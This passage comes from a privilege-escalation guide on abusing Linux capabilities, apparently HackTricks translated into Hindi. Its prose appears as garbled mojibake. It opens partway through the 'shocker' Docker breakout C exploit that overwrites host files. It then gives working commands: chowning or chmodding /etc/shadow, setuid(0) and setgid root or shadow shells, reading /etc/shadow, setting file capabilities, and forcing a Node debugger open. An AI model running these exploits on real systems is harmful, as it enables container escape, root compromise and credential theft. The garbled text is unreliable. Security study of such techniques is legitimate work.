if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рд╣реЛрд╕реНрдЯ рд╕реЗ рдлрд╝рд╛рдЗрд▓ `/etc/shadow` рдФрд░ `/etc/passwd` рдХреЛ **рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдореЗрдВ рдПрдХ **рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЙрдиреНрд╣реЗрдВ **`shocker_write`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, **ssh** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкрд╣реБрдВрдЪ** рд╕рдХрддреЗ рд╣реИрдВред

**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдХреЛрдб "Abusing DAC\_OVERRIDE Capability" рдХреЗ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдорд╛рди рд▓реЗрдВ рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рдЖрдк **shadow** рдлрд╝рд╛рдЗрд▓ рдХреЗ **рд╕реНрд╡рд╛рдореА** рдХреЛ **рдмрджрд▓** рд╕рдХрддреЗ рд╣реИрдВ, **рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓** рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
рдпрд╛ рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде **`ruby`** рдмрд╛рдЗрдирд░реА:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдкрд╛рдпрдерди рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ рддреЛ рдЖрдк рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдкрд╛рдпрдерди рдХреЗ рдкрд╛рд╕ рдпрд╣ **рдХреНрд╖рдорддрд╛** рд╣реИ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд░реВрдЯ рддрдХ рдЙрдиреНрдирдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**рдПрдХ рдФрд░ рддрд░реАрдХрд╛:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡реА рд╕рдореВрд╣ рдЖрдИрдбреА рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

рдпрд╣рд╛рдВ рдмрд╣реБрдд рд╕рд╛рд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк **рдЙрдЪреНрдЪрддрдо рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** [**рдЖрдк рдпрд╣рд╛рдВ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)ред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреМрди рд╕реА рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╕рдореВрд╣ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рд╕рдореВрд╣ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрдЬ рд▓реЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдкрдврд╝рдиреЗ рдпрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), рддреЛ рдЖрдк **рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣ рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рдореВрд╣ shadow рдХреА рдЕрдиреБрдХрд░рдг рдХреА рдЧрдИ рдереА, рдЗрд╕рд▓рд┐рдП рдЖрдк `/etc/shadow` рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cat /etc/shadow
```
рдпрджрд┐ **docker** рд╕реНрдерд╛рдкрд┐рдд рд╣реИ рддреЛ рдЖрдк **docker рд╕рдореВрд╣** рдХрд╛ **рдЕрдиреБрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ [**docker рд╕реЙрдХреЗрдЯ** рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ](./#writable-docker-socket).

## CAP\_SETFCAP

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдкрд░ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ python рдореЗрдВ рдпрд╣ **рдХреНрд╖рдорддрд╛** рд╣реИ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд░реВрдЯ рддрдХ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк CAP\_SETFCAP рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдореЗрдВ рдПрдХ рдирдИ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рдЦреЛ рджреЗрдВрдЧреЗред
{% endhint %}

рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ [SETUID рдХреНрд╖рдорддрд╛](linux-capabilities.md#cap\_setuid) рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреЗ рдЦрдВрдб рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**рдЙрджрд╛рд╣рд░рдг рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде (Docker breakout)**

рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдХреЗ рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреНрд╖рдорддрд╛ **CAP\_SETFCAP рджреА рдЬрд╛рддреА рд╣реИ**ред рдЖрдк рдРрд╕рд╛ рдХреБрдЫ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
рдпрд╣ рдХреНрд╖рдорддрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ **рдХрд┐рд╕реА рдЕрдиреНрдп рдХреНрд╖рдорддрд╛ рдХреЛ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ**, рдЗрд╕рд▓рд┐рдП рд╣рдо **рдЗрд╕ рдкреЗрдЬ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдХреНрд╖рдорддрд╛ рдмреНрд░реЗрдХрдЖрдЙрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЖрдк gdb рдмрд╛рдЗрдирд░реА рдХреЛ CAP\_SYS\_ADMIN рдФрд░ CAP\_SYS\_PTRACE рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рджреЗрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рддреЛ рдЖрдк рджреЗрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдмрд╛рдж рдмрд╛рдЗрдирд░реА **рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдореИрдВрдиреЗ рдпрд╣ рдкрдврд╝рд╛ рд╣реИ: _Permitted: рдпрд╣ рдПрдХ **рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдорд┐рдд рд╕реБрдкрд░рд╕реЗрдЯ рд╣реИ** рдЬрд┐рдиреНрд╣реЗрдВ рдереНрд░реЗрдб рдЕрд╕реНрдорд┐рддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдРрд╕реА рд╕реАрдорд┐рдд рд╕реБрдкрд░рд╕реЗрдЯ рднреА рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдПрдХ рдереНрд░реЗрдб рджреНрд╡рд╛рд░рд╛ рд╡рд╛рд░реНрддрд╛рд▓рд╛рдкрд┐рдд рд╕реЗрдЯ рдореЗрдВ **CAP\_SETPCAP** рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред_\
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ Permitted рдХреНрд╖рдорддрд╛рдПрдВ рдЙрдиреНрд╣реЗрдВ рд╕реАрдорд┐рдд рдХрд░рддреА рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдбреЙрдХрд░ рднреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **CAP\_SETPCAP** рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк **рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдирдИ рдХреНрд╖рдорддрд╛рдПрдВ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдХреИрдк рдХреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдпрд╣ рд▓рд┐рдЦрд╛ рд╣реИ: _CAP\_SETPCAP: \[...\] **рд╡рд╛рд░реНрддрд╛рд▓рд╛рдк рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдереНрд░реЗрдб рдХреЗ рдмрд╛рдЙрдВрдбрд┐рдВрдЧ рд╕реЗрдЯ рд╕реЗ рдХреЛрдИ рднреА рдХреНрд╖рдорддрд╛ рдЙрд╕рдХреА рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддреА рд╣реИ**_ред\
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдХреЗрд╡рд▓ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдмрд╛рдЙрдВрдбрд┐рдВрдЧ рд╕реЗрдЯ рд╕реЗ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд╣рдо рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдирдИ рдХреНрд╖рдорддрд╛рдПрдВ рдЬреИрд╕реЗ CAP\_SYS\_ADMIN рдпрд╛ CAP\_SYS\_PTRACE рдХреЛ рдирд╣реАрдВ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдПрдВ**ред

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` рдпрд╛ `/proc/kcore` рддрдХ рдкрд╣реБрдВрдЪ, `mmap_min_addr` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ, `ioperm(2)` рдФрд░ `iopl(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдбрд┐рд╕реНрдХ рдХрдорд╛рдВрдбред рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `FIBMAP ioctl(2)` рднреА рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдиреЗ [рдкрд┐рдЫрд▓реЗ](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) рдореЗрдВ рд╕рдорд╕реНрдпрд╛рдПрдВ рдкреИрджрд╛ рдХреА рд╣реИрдВред рдореИрди рдкреЗрдЬ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЗрд╕рдХреЗ рдзрд╛рд░рдХ рдХреЛ рдЕрдиреНрдп рдЙрдкрдХрд░рдгреЛрдВ рдкрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдХрд░рдг-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдкрд░реЗрд╢рди рдХрд░рдиреЗ` рдХреА рдЕрдиреБрдорддрд┐ рднреА рд╣реЛрддреА рд╣реИред

рдпрд╣ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ** рдФрд░ **Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## CAP\_KILL

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЪрд▓реЛ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдпрд╛ рд╕реЙрдХреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (рдпрд╛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд┐рд╕реА рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓) рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЙрд╕реЗ рдмреИрдХрдбреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рдЙрд╕ рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЗ рдмреИрдХрдбреЛрд░ рдХреЗ рд╕рд╛рде рдирдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирдпрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╝рд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill** рдХреЗ рд╕рд╛рде Privesc

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ kill рдХреНрд╖рдорддрд╛рдПрдВ рд╣реИрдВ рдФрд░ рдПрдХ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ** (рдпрд╛ рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ) **рдиреЛрдб рдкреНрд░реЛрдЧреНрд░рд╛рдо** рд╣реИ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЗрд╕реЗ **рд╕рд┐рдЧреНрдирд▓ SIGUSR1** рднреЗрдЬрдХрд░ рдЗрд╕реЗ **рдиреЛрдб рдбреАрдмрдЧрд░ рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдЖрдк рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде**, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

